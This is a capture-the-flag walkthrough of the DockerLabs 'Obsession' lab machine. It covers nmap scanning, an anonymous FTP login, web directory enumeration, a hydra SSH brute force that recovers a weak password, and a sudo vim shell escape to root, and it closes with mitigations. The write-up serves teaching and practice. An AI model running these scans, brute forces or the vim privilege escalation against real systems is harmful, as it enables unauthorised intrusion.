
# 🐳 DockerLabs - Obsession


# 📌 General information


| Machine   | Difficulty | Author | Target IP  | Category                                                   |
| --------- | ---------- | ------ | ---------- | --------------------------------------------------------- |
| Obsession | Very easy  | Juan   | 172.17.0.2 - Web enumeration<br>- Network protocols (ftp, ssh, http) -  |

![[obsession.png]]


# 🎯 Objective

Identify exposed services, detect vulnerabilities, and gain access to the target system.


# 🛠️ Tools

- ***ping***: Connectivity and range check
- ***nmap***: Port and services scanning and recongnition
- ***curl***: http requests
- ***wget***: File downloading
- ***gobuster*** and ***dirb***: Web directory analysis
- ***hydra***: ssh brute force attacks


# 🔌 Ports


| Port | Service |
| ---- | ------- |
| 21   | ftp     |
| 22   | ssh     |
| 80   | http    |


# 📡 Network scan with ***nmap***

```bash
nmap -sn 172.17.0.0/16
```

![[obsession/img_1.png]]


# 📡 Connectivity with ***ping***

```bash
ping -c4 172.17.0.2
```

![[obsession/img_2.png]]


# 🩻 Scanning target using ***nmap***

```bash
nmap -p- -Pn -sS -sV -sC -O -T4 --open 172.17.0.2 -oN 172.17.0.2_scan
```

Result:
```bash
# Nmap 7.991 scan initiated Sat Oct 31 00:09:23 2026 as: /usr/lib/nmap/nmap -p- -Pn -sS -sV -sC -O -T4 --open -oN 172.17.0.2_  
scan 172.17.0.2  
Nmap scan report for 172.17.0.2 (172.17.0.2)  
Host is up (0.000069s latency).  
Not shown: 65532 closed tcp ports (reset)  
PORT   STATE SERVICE VERSION  
21/tcp open  ftp     vsftpd 3.0.5  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
| -rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt  
|_-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt  
| ftp-syst:    
|   STAT:    
| FTP server status:  
|      Connected to ::ffff:172.17.0.64  
|      Logged in as ftp  
|      TYPE: ASCII  
|      No session bandwidth limit  
|      Session timeout in seconds is 300  
|      Control connection is plain text  
|      Data connections will be plain text  
|      At session startup, client count was 1  
|      vsFTPd 3.0.5 - secure, fast, stable  
|_End of status  
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)  
|_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)  
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))  
|_http-title: Russoski Coaching  
|_http-server-header: Apache/2.4.58 (Ubuntu)  
MAC Address: FA:0A:45:87:68:87 (Unknown)  
Device type: general purpose  
Running: Linux 4.X|5.X  
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5  
OS details: Linux 4.15 - 5.19  
Network Distance: 1 hop  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Sat Oct 31 00:09:32 2026 -- 1 IP address (1 host up) scanned in 8.93 seconds
```


# 🔗 ftp connection

Using ftp to connect to target using the info obtained with ***nmap*** we use

```bash
ftp ftp@172.17.0.2
```

| user | password |
| :--: | :------: |
| ftp  |   none   |

There are two files located in the ftp server root

![[obsession/img_3.png]]

Downloading these files, the content is

![[obsession/img_4.png]]

![[obsession/img_5.png]]

There is sensitive information in these files, like private chats and personal information


# 🌐 Sending request to http server

```bash
curl -I http://172.17.0.2:80
```

![[obsession/img_6.png]]


# 🩻 Scanning http server with ***gobuster*** and ***dirb***

Result with ***gobuster***

```bash
gobuster dir -u http://172.17.0.2:80 -w DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt,sh -t 4
```

![[obsession/img_7.png]]

Result with ***dirb***

```bash
dirb http://172.17.0.2
```

![[obsession/img_8.png]]

Checking the backup directory for files:

![[obsession/img_9.png]]

Content of file ***backup.txt***, user hint inside it

![[obsession/img_10.png]]

Content of file ***important.md***

![[obsession/img_11.png]]


# 💣 SSH Brute Force Attack

Using SSH brute force attack using the user found in ***backup.txt*** file content with ***hydra*** and the ***rockyou*** list

![[obsession/img_12.png]]

|   user   | password |
| :------: | -------- |
| russoski | iloveme  |


# 🔗 Connecting using found credentials

![[img_13.png]]

Connection to user successful, but root access not reached yet


# 📈 Increasing access

Checking the user's permissions, the user is able to execute ***vim*** with root permissions
![[img_14.png]]

Executing the command below

```bash
sudo -u root /usr/bin/vim -c ':!/usr/bin/bash'
```

![[img_15.png]]

***Root access obtained!***


# 🔑 Key points

- User hint exposed in web page files
- Vulnerable SSH password
- Low control over users permissions and control access
- Sensitive information in ***ftp*** and ***web*** servers


# ☠️ Impact

- Full system compromise
- Root level access obtained
- Personal information exposed


# 🔐 Mitigation

- Use a stronger password
- Be careful about the information shown in webpages and directories exposed in them
- Have an strict control for users and permissions
- Do not save information in simple files and non encrypted files


# 📜 Conclusion

Target machine exploited successfully
1. Identify open ports
2. Exploring and scanning webpages for different ways to penetrate and information
3. Valid credentials detection using brute force attack
4. Scaling access through users and different programs
5. Found sensitive information